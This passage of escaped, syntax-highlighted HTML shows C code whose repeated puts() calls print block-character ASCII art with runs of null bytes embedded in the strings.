style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
